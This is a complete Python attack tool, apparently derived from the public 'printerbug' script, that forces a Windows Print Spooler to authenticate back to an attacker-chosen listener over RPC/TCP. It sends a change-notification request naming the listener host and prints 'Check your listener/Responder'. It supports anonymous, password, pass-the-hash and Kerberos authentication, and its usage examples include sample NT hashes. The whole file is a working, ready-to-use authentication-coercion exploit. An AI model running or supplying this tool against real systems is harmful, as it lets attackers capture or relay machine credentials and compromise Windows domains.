#!/usr/bin/env python3
"""
Pure RPC over TCP example for Print Spooler on Windows 11 22H2+ / Server 2025
Uses direct TCP/IP RPC transport (ncacn_ip_tcp) - the new default for spoolss
Based on https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
"""

import argparse
import logging
import os
import sys

from impacket.dcerpc.v5 import epm, transport, rprn
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_CONNECT
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.dtypes import NULL

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class _SupressFilter(logging.Filter):
    def __init__(self, *fragments):
        self._fragments = fragments
    def filter(self, record):
        return not any(f in record.getMessage() for f in self._fragments)

logging.getLogger('impacket').addFilter(_SupressFilter('CCache file is not found'))


class RpcTcpPrinterTrigger:
    def __init__(self, target_host, username='', password='', domain='',
                 lmhash='', nthash='', aes_key='', listener=None, tcp_port=None,
                 use_kerberos=False, dc_ip=None):
        self.target_host = target_host
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = lmhash
        self.nthash = nthash
        self.aes_key = aes_key
        self.listener = listener if listener else target_host
        self.tcp_port = tcp_port
        self.use_kerberos = use_kerberos
        self.dc_ip = dc_ip

    def trigger_rpc_backconnect(self):
        try:
            if self.tcp_port:
                stringbinding = f'ncacn_ip_tcp:{self.target_host}[{self.tcp_port}]'
                logging.info(f'Using specified port: {self.tcp_port}')
            else:
                logging.info('Querying endpoint mapper for spoolss port (TCP/135)...')
                try:
                    stringbinding = epm.hept_map(
                        self.target_host, rprn.MSRPC_UUID_RPRN, protocol='ncacn_ip_tcp'
                    )
                    logging.info(f'EPM resolved spoolss to: {stringbinding}')
                except Exception as e:
                    logging.error(f'Endpoint mapper lookup failed: {e}')
                    logging.error(
                        'Print Spooler not found in endpoint mapper — '
                        'is the Print Spooler service running on the target? '
                        'Is TCP/135 reachable?'
                    )
                    return False

            logging.info(f'Connecting to {stringbinding}')
            rpctransport = transport.DCERPCTransportFactory(stringbinding)

            if self.use_kerberos:
                rpctransport.set_credentials(self.username, self.password, self.domain,
                                             aesKey=self.aes_key)
                rpctransport.set_kerberos(True, self.dc_ip)
                krb_desc = 'AES key' if self.aes_key else 'ccache'
                logging.info(f'Using Kerberos auth: {self.domain}\\{self.username} ({krb_desc}, KDC: {self.dc_ip or "auto"})')
            elif self.username:
                rpctransport.set_credentials(self.username, self.password, self.domain,
                                             lmhash=self.lmhash, nthash=self.nthash)
                auth_desc = '(hash)' if self.nthash else '(password)'
                logging.info(f'Using credentials: {self.domain}\\{self.username} {auth_desc}')
            else:
                logging.info('Using anonymous/null session')

            dce = rpctransport.get_dce_rpc()

            if self.use_kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
                dce.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
            elif self.username:
                dce.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)

            logging.info('Establishing RPC over TCP connection...')
            dce.connect()
            logging.info('Connected successfully via RPC over TCP')

            logging.info('Binding to Print Spooler (MS-RPRN) interface...')
            dce.bind(rprn.MSRPC_UUID_RPRN)
            logging.info('Bound successfully to spoolss via RPC over TCP!')

            logging.info(f'Opening printer handle for \\\\{self.target_host}')
            try:
                resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % self.target_host)
            except Exception as e:
                error_str = str(e)
                if 'Broken pipe' in error_str:
                    logging.error('Connection failed - broken pipe')
                    return False
                elif 'ACCESS_DENIED' in error_str.upper():
                    logging.error('Access denied - insufficient privileges')
                    dce.disconnect()
                    return False
                elif 'RPC_S_SERVER_UNAVAILABLE' in error_str.upper():
                    logging.error('Print Spooler service not available')
                    dce.disconnect()
                    return False
                else:
                    logging.error(f'Failed to open printer: {e}')
                    raise

            logging.info('Got printer handle successfully')

            logging.info(f'Creating change notification pointing to \\\\{self.listener}')
            request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
            request['hPrinter'] = resp['pHandle']
            request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
            request['pszLocalMachine'] = '\\\\%s\x00' % self.listener
            request['pOptions'] = NULL

            try:
                logging.info('Sending RPC request to trigger backconnect...')
                resp = dce.request(request)
                logging.info('RPC request completed successfully')
            except Exception as e:
                logging.warning(f'RPC request exception (may be expected): {e}')

            logging.info(f'[SUCCESS] Triggered RPC backconnect to \\\\{self.listener}')
            logging.info('Check your listener/Responder for incoming authentication!')

            dce.disconnect()
            logging.info('Disconnected from target')

            return True

        except Exception as e:
            error_str = str(e)
            if 'abstract_syntax_not_supported' in error_str:
                logging.error('RPRN interface not supported on the resolved port')
                logging.error('Try specifying the port explicitly with --port')
                return False
            elif 'Connection refused' in error_str or 'timed out' in error_str.lower():
                logging.error(f'Cannot connect to target: {e}')
                logging.error('Check that TCP/135 and the dynamic RPC port range (49152-65535) are reachable')
                return False
            else:
                logging.error(f'Error during RPC operation: {e}')
                return False


EXAMPLES = """\
examples:
  # anonymous
  %(prog)s -t 10.10.11.50 -l 10.10.14.5

  # cleartext credentials
  %(prog)s -t 10.10.11.50 -u Administrator -p 'P@ssw0rd' -d CORP -l 10.10.14.5

  # pass-the-hash (NT hash only)
  %(prog)s -t 10.10.11.50 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d CORP -l 10.10.14.5

  # Kerberos with ccache (use FQDN as target for SPN; KRB5CCNAME can also be set in the environment)
  %(prog)s -t wmc-ca.corp.local -u 'svc$' -d CORP -k --ccache svc.ccache --dc-ip 10.10.11.1 -l 10.10.14.5

  # specific RPC port (skip EPM lookup)
  %(prog)s -t 10.10.11.50 -u svc -H aad3b435b51404eeaad3b435b51404ee -d CORP -l 10.10.14.5 --port 49152
"""


def main():
    parser = argparse.ArgumentParser(
        description='Print Spooler RPC/TCP trigger — Windows 11 22H2+ / Server 2025',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=EXAMPLES,
    )
    parser.add_argument('-t', '--target', required=True,
                        help='target hostname or IP (use FQDN with -k for Kerberos SPN resolution)')
    parser.add_argument('-u', '--username', default='',
                        help='username')
    parser.add_argument('-p', '--password', default='',
                        help='plaintext password')
    parser.add_argument('-H', '--hashes', metavar='NTHASH', default=None,
                        help='NT hash for pass-the-hash (32 hex chars)')
    parser.add_argument('-d', '--domain', default='',
                        help='domain')
    parser.add_argument('-l', '--listener', default=None,
                        help='listener IP/host for backconnect (default: TARGET)')
    parser.add_argument('--port', type=int, default=None,
                        help='specific spoolss RPC/TCP port (omit to query EPM)')
    parser.add_argument('-k', '--kerberos', action='store_true',
                        help='use Kerberos authentication (ccache via KRB5CCNAME or --ccache)')
    parser.add_argument('--ccache', default=None,
                        help='path to ccache file (sets KRB5CCNAME, implies -k)')
    parser.add_argument('--aes-key', metavar='HEXKEY', default=None,
                        help='AES128/256 key for Kerberos auth (implies -k)')
    parser.add_argument('--dc-ip', default=None,
                        help='IP of the domain controller / KDC')
    args = parser.parse_args()

    use_kerberos = args.kerberos or bool(args.ccache) or bool(args.aes_key)

    if args.ccache:
        os.environ['KRB5CCNAME'] = args.ccache
        logging.info(f'KRB5CCNAME set to: {args.ccache}')

    nthash = args.hashes or ''
    lmhash = ''

    print("=" * 70)
    print("Print Spooler RPC/TCP Trigger  —  Windows 11 22H2+ / Server 2025")
    print("=" * 70)
    listener = args.listener or args.target
    print(f"Target:    {args.target}")
    print(f"Listener:  {listener}")
    if use_kerberos:
        auth = f"{args.domain}\\{args.username}" if args.domain else args.username
        if args.aes_key:
            krb_method = f'AES key ({args.aes_key[:8]}...)'
        elif args.ccache:
            krb_method = f'ccache ({args.ccache})'
        else:
            krb_method = 'ccache (KRB5CCNAME)'
        print(f"Auth:      {auth or '(from ccache)'} (Kerberos / {krb_method})")
        print(f"KDC:       {args.dc_ip or 'auto'}")
    elif args.username:
        auth = f"{args.domain}\\{args.username}" if args.domain else args.username
        auth += " (hash)" if nthash else " (password)"
        print(f"Auth:      {auth}")
    else:
        print("Auth:      anonymous")
    print(f"Port:      {args.port if args.port else 'dynamic (EPM)'}")
    print("=" * 70)
    print()

    trigger = RpcTcpPrinterTrigger(
        target_host=args.target,
        username=args.username,
        password=args.password,
        domain=args.domain,
        lmhash=lmhash,
        nthash=nthash,
        listener=args.listener,
        tcp_port=args.port,
        use_kerberos=use_kerberos,
        aes_key=args.aes_key or '',
        dc_ip=args.dc_ip,
    )

    success = trigger.trigger_rpc_backconnect()

    print()
    if success:
        print("[+] Operation completed successfully!")
        print("[+] Check your listener for incoming authentication from target")
    else:
        print("[-] Operation failed — see error messages above")
        print("\nTroubleshooting:")
        print("  1. Ensure target is Windows 11 22H2+ or Server 2025")
        print("  2. Check firewall allows RPC (port 135 + dynamic ports 49152-65535)")
        print("  3. Verify Print Spooler service is running on the target")
        print("  4. For older Windows, spoolss uses Named Pipes (not TCP)")
        sys.exit(1)
